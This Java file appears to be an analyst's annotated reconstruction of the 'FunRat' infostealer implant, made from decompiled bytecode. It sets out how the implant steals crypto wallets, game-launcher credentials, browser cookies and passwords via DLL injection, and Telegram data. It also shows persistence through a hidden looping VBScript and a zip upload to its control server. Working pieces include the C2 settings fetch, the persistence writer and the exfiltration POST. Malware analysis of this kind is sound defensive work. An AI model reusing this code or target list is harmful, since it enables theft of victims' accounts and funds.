/*
 * FunRat third-stage Java implant: reconstructed control flow.
 *
 * This is a reconstruction, not operational code. It is a cleaned,
 * human-readable view of the behavior recovered from the obfuscated bytecode.
 * The string decoder, reflection helpers, and most flag fields are omitted.
 * Authoritative raw decompilation is in decompiled-stage2/javaint/core/Main.java.
 *
 * Behavioral strings were recovered from call-site state. Do not "fix" spelling
 * in names such as loadSetings or Essenital; those are the names in the sample.
 */
package reconstructed;

import java.awt.Robot;
import java.awt.image.BufferedImage;
import java.io.*;
import java.net.*;
import java.nio.charset.StandardCharsets;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.*;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;
import javax.imageio.ImageIO;

public final class JavaInt {
    // ---------------------------------------------------------------------
    // Constants recovered from the obfuscated class
    // ---------------------------------------------------------------------

    static final String HOST = "https://funrat.co";
    static final String PREMIUM_PREFIX = "30e3267e-d80c-4a8f-84e2-bb475930a37c";

    // The persistence identifier is seven characters in the original but was
    // not recovered from the encoded call-site state.
    static final String UNRECOVERED_PERSISTENCE_ID = "<7-char-id>";

    static final String UA =
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) " +
        "AppleWebKit/537.36 (KHTML, like Gecko) " +
        "Chrome/120.0.0.0 Safari/537.36";

    static final String MULTIPART_BOUNDARY = "----IngestBoundary";
    static final String JSON_FORMAT =
        "{ \"name\": \"%s\", \"uuid\": \"%s\", \"token\": \"%s\", \"pcName\": \"%s\", \"key\": \"%s\" }";

    static String PcName = System.getProperty("user.name");
    static String PcUserName = PcName + "@" + System.getenv("COMPUTERNAME");

    // Populated by loadSetings().
    static boolean Telegram, Discord, Desktop;
    static boolean DesktopCryptoWallets, WebCryptoWallets;
    static boolean Steam, Minecraft, Lunar, Feather, Essenital, Ias, Prism, MultiMC;
    static boolean CookieInject, CookieChrome, Screenshot, SystemInfo;

    // Populated during collection.
    static Path TempGU;
    static Path ilrFolderPath;

    // ---------------------------------------------------------------------
    // Entrypoint
    // ---------------------------------------------------------------------

    public static void main(String[] args) throws Exception {
        // Only the four-argument path is implemented. The fourth argument is
        // the loader cipher; padding '=' characters are removed before use.
        if (args.length != 4) {
            return;
        }
        String cipher = args[3].replace("=", "");
        new JavaInt().maybestart(args[0], args[1], args[2], cipher);
    }

    void maybestart(String name, String uuid, String token, String cipher) throws Exception {
        String settingsId = "";
        String key = cipher;

        // The loader normally sends a 36-character UUID followed by padding.
        // A premium cipher uses the UUID as a fixed key and puts the per-victim
        // settings identifier after that UUID.
        if (cipher.startsWith(PREMIUM_PREFIX)) {
            settingsId = cipher.substring(PREMIUM_PREFIX.length());
            key = PREMIUM_PREFIX;
        }

        loadSetings(settingsId);

        // The real method creates one temporary collection directory and then
        // submits the enabled collectors to a fixed thread pool.
        TempGU = Files.createTempDirectory("_flrG~j");
        // The sample appends the suffix directly to the temporary path, without
        // a separator: <temp-dir>_qdr-<user>.
        ilrFolderPath = Path.of(TempGU.toString() + "_qdr-" + PcName);
        Files.createDirectories(ilrFolderPath);

        ExecutorService pool = Executors.newFixedThreadPool(8);

        // Representative gating; the sample has more than 70 panel flags.
        if (Telegram)             pool.submit(JavaInt::tg);
        if (Discord)              pool.submit(JavaInt::getDiscordToken);
        if (Screenshot)           pool.submit(JavaInt::ScreenshotScreen);
        if (DesktopCryptoWallets) pool.submit(JavaInt::CryptoWallets);
        if (WebCryptoWallets)     pool.submit(JavaInt::CryptoWalletsWeb);
        if (Desktop)              pool.submit(JavaInt::StealDesktop);
        if (Minecraft)            pool.submit(JavaInt::grabMinecraft);
        if (CookieChrome)         pool.submit(JavaInt::CookieChrome);
        if (Steam)                pool.submit(JavaInt::grabSteam);

        // Third-party launchers.
        if (Lunar)     pool.submit(JavaInt::grabLunar);
        if (Feather)   pool.submit(JavaInt::grabFeather);
        if (Essenital) pool.submit(JavaInt::grabEssentials);
        if (Ias)       pool.submit(JavaInt::grabIass);
        if (Prism)     pool.submit(JavaInt::grabPrism);
        if (MultiMC)   pool.submit(JavaInt::grabMultiMCData);

        // Remaining collectors and persistence.
        pool.submit(JavaInt::grabEpic);
        pool.submit(JavaInt::grabEA);
        pool.submit(JavaInt::grabApple);
        pool.submit(JavaInt::grabXboxXsts);
        pool.submit(JavaInt::grabSystemInfo);
        final String sid = settingsId;
        pool.submit(() -> injectFolder(HOST, sid));
        if (CookieInject) {
            pool.submit(JavaInt::CookieInject);
        }

        pool.shutdown();
        try {
            // The sample waits two minutes, then uploads whatever was collected.
            pool.awaitTermination(2, TimeUnit.MINUTES);
        } catch (InterruptedException ignored) {
            Thread.currentThread().interrupt();
        }

        String metadata = String.format(
            JSON_FORMAT,
            name,
            uuid,
            token,
            PcUserName,
            key + settingsId        // reconstructs the full cipher
        );
        send(metadata);
    }

    // ---------------------------------------------------------------------
    // Panel settings
    // ---------------------------------------------------------------------

    static void loadSetings(String settingsId) {
        try {
            String endpoint = HOST + "/api/app-settings-public?id=" +
                URLEncoder.encode(settingsId, StandardCharsets.UTF_8);
            HttpURLConnection c = (HttpURLConnection) URI.create(endpoint).toURL().openConnection();
            c.setRequestMethod("GET");
            c.setRequestProperty("User-Agent", UA);
            c.setRequestProperty("Accept", "application/json");
            c.setConnectTimeout(15_000);
            c.setReadTimeout(15_000);

            // The real parser reads a JSON object of booleans. Names below are
            // representative; the panel controls 70+ module switches.
            Map<String, Object> json = parseJson(c.getInputStream());
            Telegram = bool(json, "Telegram");
            Discord = bool(json, "Discord");
            Desktop = bool(json, "Desktop");
            DesktopCryptoWallets = bool(json, "DesktopCryptoWallets");
            WebCryptoWallets = bool(json, "WebCryptoWallets");
            Steam = bool(json, "Steam");
            Minecraft = bool(json, "Minecraft");
            Lunar = bool(json, "Lunar");
            Feather = bool(json, "Feather");
            Essenital = bool(json, "Essenital");
            Ias = bool(json, "Ias");
            Prism = bool(json, "Prism");
            MultiMC = bool(json, "MultiMC");
            CookieInject = bool(json, "CookieInject");
            CookieChrome = bool(json, "CookieChrome");
            Screenshot = bool(json, "Screenshot");
            SystemInfo = bool(json, "SystemInfo");
        } catch (Exception ignored) {
            // The implant continues with defaults/false flags.
        }
    }

    // ---------------------------------------------------------------------
    // Collection
    // ---------------------------------------------------------------------

    static void tg() {
        // Copies tdata directories for installed Telegram clients into
        // <collection>/Telegram.
    }

    static void getDiscordToken() {
        // See DiscordSpam.java.
    }

    static void ScreenshotScreen() {
        try {
            Robot robot = new Robot();
            BufferedImage image = robot.createScreenCapture(
                new java.awt.Rectangle(java.awt.Toolkit.getDefaultToolkit().getScreenSize()));
            Files.createDirectories(ilrFolderPath);
            // The exact output name is built from a decoded suffix in the
            // sample; this placeholder keeps the reconstruction readable.
            ImageIO.write(image, "png", ilrFolderPath.resolve("screenshot.png").toFile());
        } catch (Exception ignored) {
        }
    }

    static void CryptoWallets() {
        // Desktop wallet files and LevelDB stores, including:
        //   %APPDATA%\Exodus\exodus.wallet
        //   %APPDATA%\Electrum\wallets
        //   %APPDATA%\atomic\Local Storage\leveldb
        //   %APPDATA%\Guarda\Local Storage\leveldb
        //   %APPDATA%\Coinomi\Coinomi\wallets
        // Output: <collection>/Wallets
    }

    static void CryptoWalletsWeb() {
        // Browser extension storage for wallet extensions such as MetaMask,
        // Phantom, Binance, Bybit, Coinbase, Trust, and Ronin.
        // Output: <collection>/WebWallets
    }

    static void StealDesktop() {
        // Recursively copies the user's Desktop into <collection>/desktop.
    }

    static void grabMinecraft() {
        grabMinecraftMsa();
        grabMinecraftData();
    }

    static void grabMinecraftMsa() {
        // Reads:
        //   %APPDATA%\.minecraft\launcher_msa_credentials.bin
        //   %APPDATA%\.minecraft\launcher_msa_credentials_microsoft_store.bin
        // and writes Minecraft_msa.json / Minecraft_msa_credentials.json.
    }

    static void grabMinecraftData() {
        // Reads %APPDATA%\.minecraft\launcher_accounts.json and related
        // launcher data. Prints "Find Minecraft".
    }

    static void grabSteam()    { /* Steam config, loginusers.vdf, and ssfn files */ }
    static void grabLunar()    { /* %APPDATA%\..\Local\Packages\...\LunarClient */ }
    static void grabFeather()  { /* Feather launcher profiles and accounts */ }
    static void grabEssentials() { /* Essential account/session data */ }
    static void grabIass()     { /* IAs launcher data */ }
    static void grabPrism()    { /* Prism Launcher accounts */ }
    static void grabMultiMCData() { /* MultiMC accounts */ }

    static void grabEpic() {
        // Copies GameUserSettings.ini from both:
        //   %LOCALAPPDATA%\EpicGamesLauncher\Saved\Config\Windows
        //   %APPDATA%\EpicGamesLauncher\Saved\Config\Windows
    }

    static void grabEA() {
        // Scans:
        //   %LOCALAPPDATA%\EADesktop
        //   %LOCALAPPDATA%\Electronic Arts\EA Desktop
        //   %APPDATA%\Origin
        //   %PROGRAMDATA%\Origin
        // for token/auth/account/login/credential/refresh/access/entitlement
        // files and .json/.ini/.cfg/.properties files.
        // Writes EA.txt and logs "[EA] saved".
    }

    static void grabApple() {
        // Reads Chromium Cookies databases and looks for Apple web-auth
        // cookies, including X-APPLE-WEBAUTH-TOKEN and
        // X-APPLE-DS-WEB-SESSION-TOKEN.
    }

    static void grabXboxXsts() {
        // credMgrRefreshTokens() enumerates Windows Credential Manager,
        // then exchangeMsaToXsts() requests Xbox Live/XSTS tokens.
    }

    static void grabSystemInfo() {
        // Writes <collection>/SystemInfo.txt with the output of:
        //   printHeader, basicInfo, uniqueMachineIds, windowsIdentity,
        //   hardwareInfo, securityInfo, networkConfiguration,
        //   installedPrograms, runningProcesses, startupInfoReadOnly,
        //   scheduledTasksReadOnly, servicesSummary, browserPresenceOnly,
        //   localFolderStatistics, vmSandboxIndicators
        // Prints "Inventory saved to: ".
        runInventory(ilrFolderPath.resolve("SystemInfo.txt"));
    }

    static void runInventory(Path output) {
        // See grabSystemInfo() for the exact section list.
    }

    // ---------------------------------------------------------------------
    // Browser credential theft
    // ---------------------------------------------------------------------

    static void CookieInject() {
        // Chrome, Edge, and Brave profiles.
        for (BrowserProfile browser : browserProfiles("Chrome", "Edge", "Brave")) {
            try {
                byte[] encryptedKey = getEncryptedKeyFromFile(browser.localState);
                byte[] key = decryptKey(encryptedKey);
                Path dll = unwrapDll("/CookiveV2.dll", "moddll");
                injectDll(browser, dll);
                processBrowser(browser, key, ilrFolderPath);
            } catch (Exception ignored) {
            }
        }
    }

    static byte[] getEncryptedKeyFromFile(Path localState) throws Exception {
        // Parses Local State -> os_crypt.encrypted_key or
        // os_crypt.app_bound_encrypted_key, base64-decodes it, and removes the
        // DPAPI prefix.
        return new byte[0];
    }

    static Path unwrapDll(String resource, String prefix) throws Exception {
        Path dll = Files.createTempFile(prefix, ".dll");
        try (InputStream in = JavaInt.class.getResourceAsStream(resource)) {
            Files.copy(in, dll, StandardCopyOption.REPLACE_EXISTING);
        }
        return dll;
    }

    static void injectDll(BrowserProfile browser, Path dll) {
        // meow.loadLibraryRemoteWithError(pid, dll) -> remote LoadLibraryW.
    }

    static byte[] decryptKey(byte[] encryptedKey) {
        // DPAPI or AES-GCM; the App-Bound path talks to the injected DLL over
        // a named pipe.
        return new byte[0];
    }

    static void processBrowser(BrowserProfile browser, byte[] key, Path output) {
        // Writes <output>/Cookies and <output>/Passwords.
    }

    static void CookieChrome() {
        // Remote-debugging path: launch Chromium with
        //   --remote-debugging-port=9222 --headless
        //   --remote-allow-origins=* --restore-last-session
        //   --user-data-dir=<temp> [--profile-directory=<profile>]
        // GET http://localhost:9222/json, pick webSocketDebuggerUrl, then
        // send {"id":1,"method":"Network.getAllCookies"}.
        //
        // The websocket client is based on Tyrus/Grizzly and handles the
        // result.cookies array. The endpoint is discovered at runtime, so no
        // synthetic URL is shown here.
    }

    // ---------------------------------------------------------------------
    // Persistence
    // ---------------------------------------------------------------------

    static void injectFolder(String host, String settingsId) {
        try {
            Path dir = Paths.get(System.getenv("APPDATA"), "Microsoft", "SecurityUpdates");
            Files.createDirectories(dir);

            String first = configSlot(host, "1");
            String second = configSlot(host, "2");
            if (first == null || !first.startsWith("http")) {
                first = host + "/api/hlam/files/4001";
            }
            if (second == null || !second.startsWith("http")) {
                second = host + "/api/hlam/files/4003";
            }

            Path launcher = dir.resolve("JavaSecurity.jar");
            Path implant = dir.resolve("JavaInt.jar");
            download(first, launcher);
            download(second, implant);

            add(dir, UNRECOVERED_PERSISTENCE_ID, host);
        } catch (Exception ignored) {
        }
    }

    static void add(Path dir, String id, String host) throws Exception {
        Path auto = Paths.get(System.getenv("APPDATA"), "AutoStartMini");
        Files.createDirectories(auto);

        // The routine first creates and removes <id>-super.bat; only the VBS
        // remains.
        Path bat = auto.resolve(id + "-super.bat");
        Files.write(bat, new byte[0]);
        Files.deleteIfExists(bat);

        String java = currentJavaExecutable();
        String command = "\"" + java + "\" -jar \"" +
            dir.resolve("JavaSecurity.jar") + "\" " + host;

        String vbs =
            "Set s = CreateObject(\"WScript.Shell\")\r\n" +
            "Do\r\n" +
            "  s.Run \"" + command.replace("\"", "\"\"") + "\", 0, True\r\n" +
            "  WScript.Sleep 10000\r\n" +
            "Loop\r\n";

        Path script = auto.resolve(id + "-super.vbs");
        Files.write(script, vbs.getBytes(StandardCharsets.US_ASCII));

        // Exact ProcessBuilder argv was not recovered. The observable effect is
        // a hidden wscript launch of the VBS.
        launchHidden(script);
    }

    static String currentJavaExecutable() {
        // Tries PowerShell:
        //   powershell.exe -NoProfile -Command (Get-Process -Id <pid>).Path
        // and falls back to "java".
        return "java";
    }

    static void launchHidden(Path script) {
        // The exact ProcessBuilder argument vector was not recovered. The
        // observable effect is a hidden wscript launch of the VBScript.
    }

    // ---------------------------------------------------------------------
    // Exfiltration
    // ---------------------------------------------------------------------

    static void send(String metadata) {
        Path archive = null;
        try {
            archive = zipCollection(ilrFolderPath);

            HttpURLConnection c = openTor(HOST + "/api/ingest", "POST", 15_000, 240_000);
            c.setDoOutput(true);
            c.setRequestProperty("User-Agent", UA);
            c.setRequestProperty("Content-Type",
                "multipart/form-data; boundary=" + MULTIPART_BOUNDARY);

            try (OutputStream out = c.getOutputStream()) {
                writeAscii(out, "--" + MULTIPART_BOUNDARY + "\r\n");
                writeAscii(out, "Content-Disposition: form-data; name=\"metadata\"\r\n");
                writeAscii(out, "Content-Type: application/json; charset=UTF-8\r\n\r\n");
                writeAscii(out, metadata + "\r\n");

                // Metadata-part name is exact. The file-part field name was
                // not recovered; "file" is a placeholder.
                writeAscii(out, "--" + MULTIPART_BOUNDARY + "\r\n");
                writeAscii(out, "Content-Disposition: form-data; name=\"file\"; " +
                    "filename=\"" + archive.getFileName() + "\"\r\n");
                writeAscii(out, "Content-Type: application/zip\r\n\r\n");
                Files.copy(archive, out);
                writeAscii(out, "\r\n--" + MULTIPART_BOUNDARY + "--\r\n");
            }

            c.getResponseCode();
        } catch (Exception ignored) {
        } finally {
            if (archive != null) {
                try { Files.deleteIfExists(archive); } catch (IOException ignored) {}
            }
        }
    }

    static HttpURLConnection openTor(String url, String method,
                                     int connectTimeout, int readTimeout) throws IOException {
        // Misnamed: no Tor, no SOCKS proxy. Direct HTTP(S) connection.
        HttpURLConnection c = (HttpURLConnection) URI.create(url).toURL().openConnection();
        c.setRequestMethod(method);
        c.setConnectTimeout(connectTimeout);
        c.setReadTimeout(readTimeout);
        return c;
    }

    static Path zipCollection(Path dir) throws IOException {
        // The sample creates a temporary ZIP; the exact prefix is not
        // material to the behavior.
        Path zip = Files.createTempFile("_qdr-", ".zip");
        try (ZipOutputStream out = new ZipOutputStream(Files.newOutputStream(zip))) {
            try (var walk = Files.walk(dir)) {
                for (Path p : (Iterable<Path>) walk::iterator) {
                    if (Files.isDirectory(p)) continue;
                    String name = dir.relativize(p).toString().replace('\\', '/');
                    out.putNextEntry(new ZipEntry(name));
                    Files.copy(p, out);
                    out.closeEntry();
                }
            }
        }
        return zip;
    }

    static void writeAscii(OutputStream out, String s) throws IOException {
        out.write(s.getBytes(StandardCharsets.US_ASCII));
    }

    // ---------------------------------------------------------------------
    // Helpers omitted from this reconstruction
    // ---------------------------------------------------------------------

    static Map<String, Object> parseJson(InputStream in) { return Map.of(); }
    static boolean bool(Map<String, Object> json, String key) { return false; }
    static String configSlot(String host, String slot) { return null; }
    static void download(String url, Path dest) { }
    static List<BrowserProfile> browserProfiles(String... names) { return List.of(); }

    static final class BrowserProfile {
        Path localState;
        Path cookies;
        Path passwords;
        String executable;
        String profileDirectory;
        int pid;
    }
}
